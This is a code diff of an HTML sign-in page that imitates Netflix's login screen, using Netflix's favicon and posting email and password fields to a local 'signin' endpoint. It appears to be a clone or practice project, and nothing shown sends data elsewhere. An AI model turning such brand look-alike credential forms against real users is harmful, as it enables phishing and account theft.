@@ -16,7 +16,6 @@
     <link rel="stylesheet" href="signin.css">
     <link rel="shortcut icon" href="https://www.netflix.com/in/favicon.ico" type="image/x-icon">
 
-    <script src="./signin.js" defer></script>
 </head>
 
 <body>
@@ -38,17 +37,19 @@
     <div id="content">
         <div class="pics">
             <div class="wrapper">
-                <form id="loginForm">
+                <form action="signin" method="POST">
                     <h1>Sign In</h1>
                     <div class="input-box" id="input1">
-                        <input type="text" id="email" required class="email" placeholder="Email or phone number">
+                        <label>
+                            <input type="text" name="email" required class="email" placeholder="Email or phone number">
+                        </label>
                     </div>
                     <div class="input-box" id="input2">
-                        <input type="password" id="password" required class="senha" placeholder="Password">
+                        <label>
+                            <input type="password" name="senha" required class="senha" placeholder="Password">
+                        </label>
                     </div>
-
                     <button type="submit" class="btn">Sign In</button>
-
                     <div class="remember-forgot">
                         <label><input type="checkbox">Remember Me</label>
                         <a href="#">Need help?</a>
@@ -98,6 +99,5 @@
             </select>
         </div>
 </footer>
-<script src="./signin.js"></script>
 
 </html>
